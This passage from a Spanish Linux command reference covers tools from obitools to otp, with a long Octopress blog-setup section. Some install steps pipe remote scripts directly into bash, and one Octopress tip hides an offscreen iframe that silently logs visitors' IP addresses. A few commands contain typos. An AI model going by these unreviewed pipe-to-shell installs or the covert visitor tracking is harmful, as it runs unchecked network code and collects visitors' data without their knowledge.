          Bridge obfs4 192.0.2.3:443 0123456789ABCDEF0123456789ABCDEF01234567 cert=ABCDEFGHIJKLMNOPQRSTUVWX iat-mode=0
Configuración en el archivo torrc:
$ nano ~/.tor/torrc
           UseBridges 1
           ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy
           Bridge obfs4 192.0.2.3:443 0123456789ABCDEF0123456789ABCDEF01234567 cert=ABCDEFGHIJKLMNOPQRSTUVWX iat-mode=0
Indica que se quiere usar un bridge, que Tor use obfs4proxy para manejar el tráfico obfs4 y el puente [bridge] a usar.
# systemctl restart tor (reiniciar el servicio)
# journalctl -u tor -f (verificar que esté funcionando)


obitools
Programas para analizar datos NGS [Next Generation Sequencing - Secuenciación de Nueva Generación] en un contexto de metacodificación de barras de ADN. Los programas OBITools ayudan a manipular diversos datos y archivos de secuencias de forma sencilla mediante la interfaz de línea de comandos de Unix.
$ obicount -f input.fastq (cuenta el número de registros de secuencias en el archivo input.fastq1)
$ obihead -n 10 input.fastq (ver los primeros 10 registros de secuencias de un archivo)
$ obitail -n 10 input.fastq (muestra los últimos 10 registros de secuencias)
$ obistat -a attribute_name input.fastq (proporciona estadísticas básicas como recuento, media, desviación estándar sobre los atributos especificados en el archivo input.fastq1)
$ obigrep -p "pattern" input_file.fastq > output.fastq (filtra las secuencias que coinciden con el patrón especificado y las guarda en output.fastq2)
$ ecoPCR -d database_file -e 3 -l 50 -L 2000 primer_sequence > output.fasta (utiliza ecoPCR para simular una PCR in silico con los parámetros especificados y guarda los resultados en output.fasta2.)


objcopy
$ objcopy -O binary test test.bin (convierte a codigo máquina RAW un fichero ejecutable compilado)


objdump
$ objdump -S --disassemble /bin/bash > bash.asm (Descompila en código assembler un programa compilado. En el ejemplo se ha usado /bin/bash)


oblogout
Lanzar cuadro de diálogo para reiniciar, cerrar, suspender... en escritorios ligeros.


obmenugen
Generador de menús para escritorios ligeros (openbox, fluxbox...)
$ obmenugen


obsession
Asistentes de gestión de sesiones para entornos de escritorio ligeros. Incluye las herramientas obsession-logout [muestra un cuadro de diálogo donde puede elegir si desea cerrar la sesión, apagar, suspender o hibernar el equipo], obsession-exit [versión de línea de comandos de obsession-logout] y xdg-autostart [inicia automáticamente los programas definidos en /etc/xdg/autostart y ~/.config/autostart]
$ obsession-exit -p (apaga el equipo)
$ obsession-exit -s (suspende)
$ obsession-exit -H (hiberna)
$ obsession-exit -r (reinicia)
$ obsession-exit -c (indica las capacidades de energia)


ocfs2-tools
[Oracle Cluster File System 2]. Herramientas para la gestión de sistemas de archivos de clúster desarrollado por Oracle. Permite que múltiples nodos [servidores] monten y accedan a un sistema de archivos al mismo tiempo sobre almacenamiento compartido, por ejemplo, SAN o iSCSI, manteniendo coherencia y evitando corrupción de datos. El paquete ocfs2-tools instala una serie de herramientas para crear, gestionar, verificar y configurar sistemas de archivos OCFS2. Incluye comandos como: mkfs.ocfs2, fsck.ocfs2, tunefs.ocfs2, debugfs.ocfs2 y o2cb
# mkfs.ocfs2 -L "mi_cluster" /dev/sdb1 (crear un sistema de archivos OCFS2 en /dev/sdb1 con la etiqueta "mi_cluster")
# modprobe ocfs2 (carga el módulo)
# mount -t ocfs2 /dev/sdb1 /mnt/ocfs2 (montar el sistema de archivos)
# fsck.ocfs2 /dev/sdb1 (verifica la integridad del sistema de archivos, como fsck para ext4, pero específico para OCFS2)
# tunefs.ocfs2 -L "nuevo_nombre" /dev/sdb1 (cambia la etiqueta del sistema de archivos OCFS2)
# debugfs.ocfs2 /dev/sdb1 (entra en un entorno interactivo tipo shell para inspeccionar inodos, bloques, etc)
# o2cb.init start (iniciar para administrar la pila de clúster O2CB)
# o2cb add-cluster mi_cluster (ver los nodos)
# o2cb add-node mi_cluster nodo1 --ip 192.168.1.10 --number 0 (configurar nodos)


oci-seccomp-bpf-hook
Hook OCI [Open Container Initiative] para rastrear llamadas al sistema y generar un perfil de seccomp [SECure COMPuting mode] que es un mecanismo de seguridad del kernel de Linux que restringe las llamadas al sistema que un proceso puede realizar. Este proyecto proporciona un hook OCI para generar perfiles de seccomp mediante el rastreo de las llamadas al sistema [syscalls] realizadas por el contenedor. El perfil generado permitirá todas las llamadas al sistema realizadas y denegará el resto.
$ grep CONFIG_SECCOMP= /boot/config-$(uname -r) (comprobar si el kernel admite seccomp)
       CONFIG_SECCOMP=y
# docker run --rm --hook-spec /usr/share/oci/hooks.d/oci-seccomp-bpf-hook.json -v /tmp/seccomp:/output nginx (especifica la configuración del hook y monta un directorio donde se guardará el perfil generado /output/seccomp.json)
$ cat /tmp/seccomp/seccomp.json (ver el perfil generado)
Nota.- defaultAction: SCMP_ACT_ERRNO: Deniega cualquier syscall no permitida y syscalls.names: Lista de syscalls permitidas.
# docker run --rm --security-opt seccomp=/tmp/seccomp/seccomp.json nginx (aplicará el perfil generado, permitiendo solo las syscalls registradas)
1.-
Usando runc y con un contenedor definido en un bundle OCI, con su config.json. Modificar el archivo config.json del contenedor para incluir el hook:
       "hooks": {
         "poststart": [
           {
             "path": "/usr/lib/oci/hooks.d/oci-seccomp-bpf-hook",
             "args": ["oci-seccomp-bpf-hook", "-o", "/tmp/seccomp-profile.json"]
           }
         ]
       }
Indica que, después de iniciar el contenedor, se ejecutará el hook y se generará un archivo /tmp/seccomp-profile.json con el perfil generado.
# runc run mi_contenedor (Ejecutar el contenedor con runc)


oclock
Muestra la hora actual en una pantalla analógica.
$ oclock -fg red -bg yellow -minute green -geometry 150x150 (manecilla de las horas en rojo, fondo amarillo, la de los cuartos verde y geomatria 150x150)


octopress
[git-core curl zlib1g-dev libssl-dev build-essential libreadline-dev libaml]. CMS para gestión de contenido web que genera automaticamente los archivos html, css y javascript a partir de archivos de texto plano formateado en markdown (Ver) y sin utilizar base de datos.
Pasos previos para su instalación en Debian y derivados:
$ curl -L https://get.rvm.io | bash -s stable –ruby
$ source ~/.rvm/scripts/rvm
$ rvm install 1.9.3
$ rvm use 1.9.3
$ rvm rubygems latest
En Arch (requiere el paquete curl):
$ curl -L get.rvm.io | bash -s stable
$ source ~/.rvm/scripts/rvm
$ rvm requirements
$ rvm install 1.9.3
$ rvm use 1.9.3 –default
$ rvm rubygems current
Instalación de octopress:
$ git clone git://github.com/imathis/octopress.git octopress
$ cd octopress
$ gem install bundler
$ bundle install
$ rake install
Generar contenido (Ver markdown):
$ cd octopress
$ rake new_post[“nombre_del_nuevo_post”]
Crea un archivo en la carpeta /home/usuario/octopress/source/_posts/ con el siguiente encabezado:
	--
	layout: post
	title: “Nombre_del_post”
	date: 2012-10-17 19:27
	comments: true
	categories:
	--
Título del post [title], fecha [date], si permitimos o no comentarios [true/false] y catagorias [categories] entre corchetes y separadas por comas [comandos, redes]
A continuación de este encabezado introducimos la entrada del post. Al finalizar la entrada para generar el archivo en la carpeta “public”:
$ rake generate
Para visualizarlo en local [http://localhost:4000] lanzar:
$ rake preview
Y no cerrar la terminal. Para matar la previsualización pulsar Ctrl +c
La configuración del titulo del blog, subtítulo, autor, etc. Algunos parámetros a especificar:
$ nano _config.yml
	url: http://crontux.homelinux.com
	title: TRACTATUS ELEMENTALIS
	subtitle: Apuntes sobre Bash. GNU/Linux a tope.
	author: lapipaplena
	simple_search: http://google.com/search
	description: Orgasmos con Gnu/linux
	date_format: "%d-%m-%Y"
	search_text: "Buscar"
	paginate: 10
	pagination_dir: blog
	recent_posts: 10
	excerpt_link: "Leer m&aacute;s &rarr;"
	code_dir: downloads/scripts
	# Twitter
	twitter_user: templix
	twitter_tweet_count: 6
	twitter_show_replies: false
	twitter_follow_button: true
	twitter_show_follower_count: false
	twitter_tweet_button: true
	# Google Plus Profile
	# Hidden: No visible button, just add author information to search results
	googleplus_user: 107431970267257491799
	googleplus_hidden: false
Para la creación de nuevas páginas:
$ rake new_page[previa]
Si queremos que la nueva página salga en una pestaña "previa" en la cabecera:
$ nano source/_includes/custom/navigation.html
	<li><a href="/previa">Previa</a></li>
En este archivo tambien se pueden personalizar los nombres de las pestañas. Si queremos una pestaña con un enlace a una web:
$ nano source/_includes/custom/navigation.html
	<li><a href="http://www.lapipaplena.net">Web</a></li>
1.-
Crear un apartado "Sobre mi" en el sidebar con una imagen web en el centro de la linea:
$ nano source/_includes/custom/asides/about.html
Con el siguiente contenido:
	<section>
	  <h1>Sobre mi</h1>
	  <center>
	  <img src="https://lh5.googleusercontent.com/-WyGxndIWvo4/AAAAAAAAAAI/AAAAAAAACRI/L_iOIAgh69A/s250-c/photo.jpg" width="125" height="125">
	  </center>
	  <p>Cualquier texto explicativo</p>
	</section>
Luego añadir el achivo en:
$ nano _config.yml
en la linea:
	default_asides: [asides/num_entradas.html, asides/recent_posts.html, custom/asides/about.html]
2.-
Para mostrar archivo con código [script.sh, por ejemplo] se ha de colocar en texto plano en la ruta especificada en _config.yml, linea code_dir [downloads/scripts/ en este caso] y si lo queremos en la barra de navegación:
$ nano source/_includes/custom/navigation.html
Y añadir la linea:
	<li><a href="{{ root_url }}/scripts">Scripts</a></li>
Si lo colocamos en un post, llamarlo con:
	% include_code script.sh lang:bash script.sh %
Al principio de la linea antes del % colocar una llave abierta y al final despues del % la cerrada. Se han omitido porque Octopress lo interpreta.
Nota.- Despues de cualquier modificación en las entradas o en los archivos de configuración lanzar:
$ rake generate
3.-
Instalar un nuevo tema:
$ git clone git://github.com/tommy351/Octopress-Theme-Slash.git .themes/slash
$ rake install['slash']
$ rake generate
4.-
Para que las busquedas se realicen en el mismo site y no en la web:
$ nano _config.yml
Modificar la linea:
	simple_search: http://www.google.com/search?q=site%3Awww.lapipaplena.net&q=
5.-
Quitar la fecha del post en la url:
$ nano _config.yml
Y dejar la linea:
permalink: /blog/:title/
Con lo que si se borran entradas antiguas para substituirlas por otras nueva con el mismo nombre, la indexación de google no se pierde.
6.-
Colocar en el sidebar un blogroll
Crear el fichero:
$ nano source/_includes/asides/blog_roll.html
Con el siguiente contenido, adaptado según gustos:
	<section>
	  <h1>Blogs útiles</h1>
	  <ul>
		  <li><a href="http://distrowatch.com">distrowatch</a></li>
		  <li><a href="http://es.wikipedia.org/wiki/Lista_de_n%C3%BAmeros_de_puerto">Listado de puertos</a></li>
		  <li><a href="http://livecdlist.com/">LiveCDs</a></li>
	   </ul>
	</section>
Editar:
$nano _config.yml
Y añadir asides/blog_roll.html a la linea:
	default_asides: [asides/recent_posts.html, asides/twitter.html, asides/blog_roll.html]
7.-
Modificar el "Posted by" por "Escrito por"
$ nano source/_includes/post/author.html
Modificar la linea que empieza por "if author":
	<span class="byline author vcard">Escrito por <span class="fn">{{ author }}</span></span>
8.-
Mostrar datos del visitante de la web:
Crear:
$ nano octopress/source/_includes/asides/ip_visitante.html
Con el siguiente contenido:
	<section>
		    <h1>Datos visitante</h1>
		    <script type="text/javascript" src="http://boastology.com/tools/ip2c/?im=1&cn=1&ip=1"></script>
	</section>
Las opciones de la url, aunque no siempre funcionan correctamente, son:
	im=1 (1 mostrar bandera, 0 no mostrar)
	cn=1 (1 mostrar nombre país, 0 no mostrar)
	ip=1 (1 IP, 0 no mostrar)
$ nano _config.yml
Y añadir a la linea default_asides el archivo según el lugar que queremos que ocupe en el sidebar [en tercer lugar en este ejemplo]:
	default_asides: [asides/num_entradas.html, asides/recent_posts.html, asides/ip_visitante.html]
9.-
Para especificar una imagen en octopress, la sintaxis es:
	{% img center http://www.lapipaplena.net/wp-content/uploads/2011/06/lapipaplena.png La_Pipa_Plena %}
Con medidas determinadas y en la derecha:
	{% img right http://www.lapipaplena.net/wp-content/uploads/2011/06/lapipaplena.png 150 250 La_Pipa_Plena %}
10.-
Modificación de colores. Por ejemplo la barra de navegación:
$ nano sass/custom/_colors.scss
Buscar la variable $nav-bg, descomentarla (quitarle las dos //) y colocar el código de color escogido:
	//$subtitle-color: lighten($header-bg, 58);
	$nav-bg: desaturate(lighten(#C68800, 18), 5);
	//$nav-bg-front: image-url('noise.png');
11.-
Colocar una imagen en el header que previamente habremos copiado en el directorio source/images/:
$ nano sass/custom/_styles.scss
Y pegamos:
	header[role="banner"] {
     	background-image: url(/images/tux.png);
     	background-position:left;
     	background-repeat: no-repeat;
	}
12.-
Quitar la opción RSS de la barra de navegación:
$ nano source/_includes/navigation.html
Y borrarlo en la linea "site.subscribe_rss"
13.-
Centrar el título del blog:
$ nano source/_includes/custom/header.html
Y dejarlo:
	<hgroup>
	  <div align=center>
	  <h1><a href="{{ root_url }}/">{{ site.title }}</a></h1>
	  {% if site.subtitle %}
		<h2>{{ site.subtitle }}</h2>
	  </div>
	  {% endif %}
	</hgroup>
13.-
Resolver el error en el rake preview "WARN  TCPServer Error: Address already in use - bind(2)"
$ lsof -i4000 (Para conocer el pid del proceso)
$ kill -9 PID
14.-
Llevar un archivo de las visita al site:
Crear en la carpeta web el archivo:
nano /var/www/getip.php
Con el siguiente contenido:
	<?php
	$userip = $_SERVER['REMOTE_ADDR'];
	$file = fopen('ips_visitantes.txt', 'r');
	$filedata = fgets($file);
	fclose($file);
	$file = fopen('ips_visitantes.txt', 'a');
	fwrite($file, "\n$filedatan$userip");
	fclose($file);
	?>
Y luego en la carpeta octopress:
$ nano source/_includes/after_footer.html
Añadir al final:
	<div style="width: 1px; height: 1px; overflow: hidden; position: absolute; left: -1000px">
	<iframe src="http://crontux.homelinux.com/getip.php"></iframe>
	</div>
15.-
Para que las url se abran en una nueva pestaña.
$ nano source/javascripts/links.js
Y pegamos:
	$(document).ready(function(){
	    $('a').each(function() {
	        var a = new RegExp('/' + window.location.host + '/');
	        if(!a.test(this.href)) {
	            $(this).click(function(event) {
	                event.preventDefault();
	                event.stopPropagation();
	                window.open(this.href, '_blank');
	            });
	        }
	    });
	});
$ nano source/_includes/head.html
Añadir la linea:
	<script src="(( root_url ))/javascripts/links.js"></script>
Nota.- Los 4 parentesis que abren y cierran el código "root_url" han de substituirse por llaves "{{"  "}}".
16.-
Añadir en el sidebar las sección "Entradas más populares" [Popular posts]
$ cd octopress
$ nano Gemfile
Y añadir al final la linea:
gem 'octopress-popular-posts'
$ bundle install
$ bundle exec octopress-popular-posts install
$ nano _config.yml
Añadir al final la linea [5 es el número de posts que saldrán]:
popular_posts_count: 5
Y en la linea "default_asides:" añadimos en el lugar que deseemos:
default_asides: [....ent_posts.html, custom/asides/popular_posts.html,custom/asid...]
$ nano .gitignore
Aadir la linea:
.page_ranks
$ nano source/_includes_custom/asides/popular_posts.html
Y substituir "Popular posts" por "Entradas más vistas"
Para mantener actualizado el plugin lanzar de vez en cuando:
$ bundle exec octopress-popular-posts install
17.-
Subir el blog a heroku.
Crear una cuenta en <http://www.heroku.com>
	$ gem install heroku (Instalar la gema)
	$ cd octopress (Entrar en el directorio)
	$ heroku create (Pedirá las credenciales de la cuenta)
	$ git config branch.master.remote heroku (Implementar el control remoto via git)
	$ rake generate (Regenerar el site)
	$ git add . (Añadir el proyecto)
	$ git commit -m 'site updated' (Commit de los cambios)
	$ git push heroku master (Subir el sitio local a heroku)
Una vez subido por primera vez el sitio, las siguientes modificaciones se reflejarán con:
	$ rake generate
	$ git commit -a -m "pequeño_comentario_de_los_cambios"
	$ git push heroku master (En algunas ocasiones es suficiente con "git push")


od
Vuelca ficheros en octal
$ od -x fichero
$ cat texto.txt | od -x texto.octal


odt2txt
Pasar archivos .odt a texto plano.
$ odt2txt archivo.odt –output=archivo.txt
$ odt2txt archivo.odt | grep palabra (Buscar una palabra en un odt. Muestra el resultado en pantalla)


ofris-en
Programa que congela los cambios realizados en el sistema. Tanto la modificación de los archivos como las configuraciones desaparecerán al reiniciar el equipo. Una vez aplicada la función de "congelar" es posible realizar cambios en la máquina y probar software potencialmente peligroso, ya que al reiniciar el sistema todo volverá a estar como estaba antes de "congelarlo". Arrancar la aplicación con:
# ofris-en
Y mostrarà un menú de opciones:
	1. Congelar un usuario
	2. Congelar un usuario que se especifica
	3. Congelar todos los usuarios
	4. Descongelar todos los usuarios
	5. Ver el estado actual de la aplicación
	6. Salir


ogg123
[vorbis-tools]. Reproductor de música para archivos .ogg
$ ogg123 archivo.ogg (forma básica)
$ ogg123 ~/Música/* (reproducirá todos los .ogg de la carpeta mencionada)


oh-my-posh
Temas varios para el prompt.
$ curl -s https://ohmyposh.dev/install.sh | bash -s (descarga e instalación))
$ oh-my-posh get shell (muestra la shell que se esta usando)
$ oh-my-posh font install (muestra listado para escoger cual)
Descarga e instalación de temas:
$ wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zip
$ unzip ~/.poshthemes/themes.zip -d ~/.poshthemes (descomprimir el .zip)
$ chmod u+rw ~/.poshthemes/*.json (permisos para los temas)
Una muestra se puede visualizar en https://ohmyposh.dev/docs/themes y una vez escogido el tema [en el ejemplo el tema "dracula"] añadir a .bashrc la linea:
eval "$(oh-my-posh --init --shell bash --config ~/.poshthemes/dracula.omp.json)"
$ $ oh-my-posh upgrade (que el nuevo prompt tenga efecto)


olive
Lector rss
$ olive archivo.opml (importar las fuentes)


omv-initsystem
Inicializa openmediavault en esta distribución de GNU/Linux basada en Debian. Es necesaria su ejecución para un correcto funcionamiento
# omv-initsystem


omv-sysinfo
En la distribución OpenMediaVault basada en Debian GNU/Linux muestra la información del sistema en formato json
# omv-sysinfo


on_ac_power
[powermgmt-base]. Determina si el sistema funciona con batería o con red electrica.
$ on_ac_power


oneko
Un gato persigue el cursor por la pantalla mientras trabajas. Alternativamente, un perro persigue un hueso. Hay opciones de menú para iniciar y detener el programa fácilmente en los modos perro y gato. Otras variaciones y configuraciones detalladas están disponibles a través de opciones de línea de comando.
$ oneko -dog -fg yellow -speed 20 (un perro, amarillo y a 20 de velocidad, por defecto 16)
$ oneko -neko (un gato. Otras alternativas: -sakura y -tomoyo)


only
Herramienta que permite buscar según patrones de palabras o patrones de líneas.
$ only -l palabra text.txt (muestra la linea donde sale "palabra")
$ only -w /palabra/0:5 text.txt (muestra "palabra" y las siguientes 5 palabras)
$ only -w 2/palabra/0:4 text.txt (muestra la 2ª vez que salie "palabra" y las siguientes 4 palabras)
$ only -l 3/palabra text.txt (muestra la 3ª linea donde sale "palabra")
$ only -l 3/palabra/0:2 text.txt (muestra la 3ª vez que sale "palabra" y las siguientes 2 lineas)


oomd
[Out Of Memory Daemon]. Demonio avanzado que utiliza métricas del kernel para detectar la presión de memoria antes de que el sistema llegue a un punto crítico y elimina procesos de acuerdo con reglas definidas en /etc/oomd/oomd.conf. Aprovecha PSI [Pressure Stall Information] y cgroupv2 [control group] [ver] para supervisar el sistema de forma integral, luego, toma medidas correctivas antes de que se produzca una falta de memoria en el espacio del núcleo eliminando los procesos infractores. Realiza un control más avanzado que la aplicación earlyoom [ver] y está integrado con systemd.
$ systemctl status systemd-oomd (virificar si está activo)
# systemctl enable systemd-oomd (activarlo en cada inicio del sistema)
Un ejemplo de configuración podría ser:
# nano /etc/systemd/oomd.conf
       [OOM]
       SwapUsedLimit=90%
       DefaultMemoryPressureLimit=80%
Significa que oomd matará procesos si la swap está utilizada en un 90% o más y si la presión de memoria del sistema alcanza el 80%. Toda modificación del archivo de configuración inplica reiniciar el servicio:
# systemctl restart systemd-oomd


oowrite
Procesador de textos de la suite ofimática openoffice.
$ oowriter -pt pdf archivo.doc


open
[xdg-open] Abrir archivos o URLs con la aplicación predeterminada.
$ open http://google.com (abre con el navegador predeterminado)
$ open archivo.txt (con el editor predeterminado)


openbox
Gestor de ventanas
$ openbox –-replace (Activa openbox)
$ openbox --restart (Reinicia)
$ openbox --reconfigure (Relee los archivos de configuración después de una modificación)
Los archivos de configuración se encuentran en el directorio: .config/openbox:
----- autostart
Donde se colocan las aplicaciones que arrancan cuando se inicia el sistema. La sintaxis es:
	(sleep 1 && nitrogen --restore) &
	(sleep 2 && lxpanel) &
	(slepp 3 && liferea) &
	(sleep 3 && volumeicon) &
	(sleep 3 && idesk) &
Retrasar [sleep] algunos segundos [1, 2, 3 ] el lanzamiento de las aplicaciones  y dejar los procesos en background [&]
----- rc.xml
Archivo de configuración de los atajos de teclado y ratón. Cada atajo ha de colocarse en el interior de la etiqueta a la que correspondan: atajos de teclado entre <keyboard> y </keyboard>, los de ratón entre <mouse> y </mouse>...
Ejemplo para abrir firefox pulsando la tecla Win + f:
	<keybind key="W-f">
	   <action name="execute">
	   <execute>firefox</execute>
	   </action>
	</keybind>
Ejemplo para mostrar el menú del botón derecho del ratón pulsando las teclas Ctrl + Alt + m:
	<keybind key="C-A-m">
	   <action name="ShowMenu">
	   <menu>root-menu</menu>
	   </action>
	</keybind>
----- xmenu.xml
El menú que se muestra con el botón derecho del mouse.
1.-
Cuando no se montan automaticamente los dispositivos usb que se conectan:
Añadir una o varias lineas a /etc/fstab con el siguiente contenido:
/dev/sdc1 /media/pen1 auto  rw,users,noauto 0 0
Modificando el nombre del dispositivo [ sdc2, sdc3...) en el gestor de archivos [thunar...] aparecera el icono y con doble clic se montará el dispositivo.


openclipart-svg
Colección de imágenes 100% libres de derechos de autor que pueden usarse sin ningún tipo de restricción. Han de visualizarse en el navegador y se encuentran en el directorio /usr/share/openclipart/svg/*. Estan ordenadas por temáticas: animals, buildings, computer, containers, decorations... y en subcarpetas. Si se instalan los paquetes openclipart-png y openclipart-libreoffice las imágenes tambien se tendran en formato png y podran incrustarse en documentos de libre office.
$ firefox /usr/share/openclipart/svg/electronics/battery/battery_snuatautisticido_04.svg
$ firefox /usr/share/openclipart/png/animals/birds/acquila_architetto_franc_01.png


opendoas
[doas] Versión  del comando doas de OpenBSD que es un reemplazo mínimo de sudo. Ejemplos de archivo de configuración /usr/share/doc/opendoas/examples/doas.conf y el archivo real de configuración [si no existe se crea]:
# nano /etc/doas.conf
Colocar el contenido que deseemos: al usuario de forma persistente y cmd nombre_del_comando:
permit persist usuario
permit nopass usuario as root cmd apt
$ doas apt update (despues de reiniciar las comandos apt como usuario sin sudo)
$ doas -C /etc/doas.conf (comprobar errores en el archivo de configuración)


openoffice
Suite ofimática
$ soffice --writer (--calc, --impress, --draw, --math, --base) Arrancar el programa
# spadmin  (Administración de impresoras)
Ajustes
1.-
Para que las presentaciones no se abran automaticamente:
Descargar (ImpressRunner.oxt):
Abrir Impress y en herramientas -> administrador de extensiones -> agregar
Buscar el archivo descargado. Reiniciar la aplicación. Cuando inicie la presentación, clicar esc y cancelar.
2.-
Para previsualizar en miniaturas los documentos:
# apt-get install ooo-thumbnailer


opensc
Utilidades para tarjetas inteligentes compatibles con la API PKCS#11 y PKCS#15 [estándart]. Ofrece un conjunto de bibliotecas y utilidades para acceder a tarjetas inteligentes y se centra principalmente en tarjetas que admiten operaciones criptográficas. Facilita su uso en aplicaciones de seguridad como cifrado de correo, autenticación y firma digital. Solo se admiten algunas tarjetas [documentación en https://github.com/OpenSC/OpenSC/wiki] y con algunos parámetros como la versión de la tarjeta, la versión del sistema operativo de la tarjeta y el subprograma precargado, tambien puede requerir software propietario de terceros.


openssl
Codificador/descodificador
$ openssl aes-128-cbc -salt -in texto -out encriptado.aes128  (encriptar)
$ openssl aes-256-cbc -d -salt -in encriptado.txt -out desencriptado.txt  (desencriptar)
$ cat texto.txt | gzip | openssl des3 -salt -k clave > texto.txt.des3
$ openssl list-cipher-commands  (listar todas las opciones de encriptado)
$ openssl enc -des3 -in archivo.tar.bz2 -out cifrado.tar.bz2.ssl  (cifrar paquetes)
$ openssl enc -d -des3 -in cifrado.tar.bz2.ssl -out archivo.tar.bz2
$ openssl rand -base64 6  (generar una contraseña)
$ openssl enc -base64 -in imagen.jpg (Codificar una imagen)
Para visualizar el resultado del encriptado:
	$ hexdump -C ejemplo.aes128
Nota.- la opción "a" indica que codificará con base64. "-salt" Añade potencia al cifrado.


openvpn
Encapsular datos entre dos redes físicas usando una red privada virtual. Existen varios sitios de internet que ofrecen este servicio de forma gratuita. Aquí usaremos a modo de ejemplo frootvpn. Nos registramos en <https://www.frootvpn.com/> y descargamos el software:
$ wget https://www.frootvpn.com/files/frootvpn.ovpn
# mv frootvpn /etc/openvpn/
# openvpn /etc/openvpn/frootvpn.ovpn (Arrancar el servicio)
Opcionalmente pueden cambiarse las DNSs:
# nano /etc/resolv.conf
Y colocar:
Nameserver 80.67.0.2


openvt
lanza un programa en una nueva consola virtual [ttyX]. Ver deallocvt
# openvt -c 9 ifconfig (Lanzar ifconfig en la /dev/tty9)


opera
Navegador
1.-
Para que google no detecte al navegador y poder usar g+
En la barra de direcciones poner:
	opera:config#ISP|Id
Y en el espacio en blanco poner:
	AppleWebKit/535.1
Guardar y reiniciar.
2.-
Suprimir el icono de la bandeja de entrada [tray]
Entrar en:
about:config
Escribir la palabra “tray” en el buscador y deseleccionar:
Show Tray Icon.
También cambiando la orden en el editor de menu:
opera %u –notrayicon
3.-
Aceleración por hardware (Opera-next 12)
about:config
Apartado “User Prefs”
Colocar los siguientes parámetros a “1”:
Enable Hardware Acceleration
Enable WebGL


operadores
(Bash scripting).
lógicos o de comparación de cadenas alfanuméricas:
	= (Verdadero si las 2 cadenas son iguales)
	!= (Verdadero si las 2 cadenas son distintas)
	-n (Informa si la cadena tiene longitud mayor a cero)
	-z (Informa si la cadena tiene longitud igual a cero)
	== (Verdadero si las 2 cadenas son iguales [solo en bash])
	< (Si una cadena es menor que otra)
	> (Si una cadena es mayor que otra)
lógicos o de comparacion de valores numericos
	x -lt y (x menor que y)
	x -le y (x menor o igual que y)
	x -eq y (x igual que y)
	x -ge y (x mayor o igual que y)
	x -gt y (x mayor que y)
	x -ne y (x no igual que y)
De comprobacion de atributos de fichero
	-d fichero (fichero existe y es un directorio)
	-e fichero (fichero existe)
	-f fichero (fichero existe y es regular [no un directorio])
	-r fichero (si fichero tiene permiso de lectura)
	-s fichero (fichero existe y no esta vacio)
	-w fichero (si fichero tiene permiso de escritura)
	-x fichero (si fichero tiene permiso de ejecucion o de busqueda si es un directorio)
	-O fichero (si eres dueño del fichero)
	-G fichero (si el grupo del fichero es igual al tuyo)
Algunos ejemplos:
1.-
Comprobar si un fichero tiene datos:
	#!/bin/bash
	A=/etc/fstab
	if [ -s "$A" ]
	then
		echo "Tiene datos"
	else
		echo "No los tiene"
	fi
2.-
Comprobar si un directorio es el personal del usuario:
	#!/bin/bash
	read -p "Ingrese un directorio: " DIR
	if [ $DIR = home ]
	then
	 	echo "Es tu directorio personal"
	else
		echo "No es tu home"
	fi
	exit 0
3.-
Verificar si un archivo pasado como argumento existe o no:
	#!/bin/bash
	if [ $# -eq 0 ]
	then
		 echo "Falta el parametro"
		 exit
	else
		if [ -f $1 ]
		then
			echo "archivo existe"
		else
			echo "archivo no existe"
		fi
	fi


operon
[exfalso]. Muestra y edita etiquetas de metadatos de audio de los formatos compatibles MP3, Ogg Vorbis, FLAC, Musepack [MPC], WavPack y MOD/XM/IT.
$ operon list Chuck_Berry_Lets_Twist_Again.mp3
          Description | Value                         | Tag
          -------------------------------------------------------
          Title       | Let's Twist Again             | title
          Artist      | Bill Haley and the Comets     | artist
          Album       | 16 Gouden Hits Laatste Nieuws | album
          Comment     | Verzamel                      | comment
          Date        | 1993                          | date
          Genre       | Rock & Roll                   | genre
$ operon info file.mp3 (muestra, codec, formato, duración...)
$ operon print -p "<album> - <artist>" file.ogg (muestra nombre del album y artista)
$ operon image-clear song.mp3 (borrar una imagen de un archivo de sonido)
$ operon tags -a (muestra listado de tags)
$ operon tags -t -c tag  (adecuada para el procesamiento de scripts y solo la columna de tag)
$ operon edit file.mp3 (edita las etiqueras para modificarlas)
$ operon clear -a file.mp3 (limpia todos los tags del archivo)
$ operon set artist 'The Emacs' file.mp3 (establece como artista el mencionado)
$ operon remove artist 'The Emacs' file.mp3 (elimina el artista del archivo)


oping
Utiliza paquetes ping para probar la accesibilidad de los hosts de red.
$ oping -4 -i 2 host1 host2 host3 (usando IPv4, con un intervalo de 2 segundos y a los hosts especificados)


opkg
Gestor de paquetes de OpenWRT, firmware linux para routers.
# opkg update (actualiza la lista de paquetes)
# opkg install paquete (instalar un paquete)
# opkg upgrade paquete (actualiza un paquete)
# opkg remove paquete (elimina un paquete)
# opkg list (ver paquetes disponibles)
# opkg list-installed (ver paquetes instalados)
# opkg list-upgradable (ver paquetes actualizables)
# opkg files paquete (Ver ficheros instalados de un paquete y la versión del mismo)
# opkg info paquete (ver información de un paquete)
# opkg find palabra (buscar paquetes por nombre y descripción)


optipng
Optimizacion de imagenes .png. La reduccion de tamaño es poca pero no pierde calidad. Como modo indicativo, un directorio con 5 imagenes con un peso de 27,5 MB pasa a 25,8 MB.
$ optipng imagen.png (Sobreescribe la imagen.png)
$ optipne imagen.png -out nueva_imagen.png (Guardar la salida con otro nombre)
$ optipng -dir imagenes (De todas las imagenes de un directorio)
$ optipng -k -o7 *.png (máxima compresión de todas las imagenes y sin sobreescribir las originales) [.bak]


orca
Lector de pantalla para personas con discapacidad visual, proporciona acceso alternativo al escritorio mediante síntesis de voz y braille.


ossec
Sistema de detección de intrusos. Durante la instalación, una vez escogido el idioma, se realizan una serie de preguntas sobre si se desea recibir por correo las notificaciones [en este caso precisa postfix], lugar de instalación [/var/ossec], si la instalación va a ser local, servidor... y otras cuyos parámetros por defecto son suficientes.
$ wget http://www.ossec.net/files/ossec-hids-2.6.tar.gz
# /var/ossec/etc/ossec.conf (Archivo de configuración:)
# /var/ossec/bin/ossec-control start (Arrancar el demonio caso de no colocarlo en /etc/init.d/ossec)


os-prober
Detecta otros sistemas operativos en un dispositivo.
# os-prober


otfinfo
[lcdf-typetools]. Mostrar las características OpenType ofrecidas por una fuente.
$ otfinfo -s /usr/share/fonts/truetype/freefont/FreeSans.ttf (Idiomas soportados)
$ otfinfo -p .fonts/3Dumb.ttf (muestra el nombre postscript)
$ otfinfo -f /usr/share/fonts/truetype/freefont/FreeMono.ttf (todas las opciones disponibles)


otp
Generador de contraseñas.
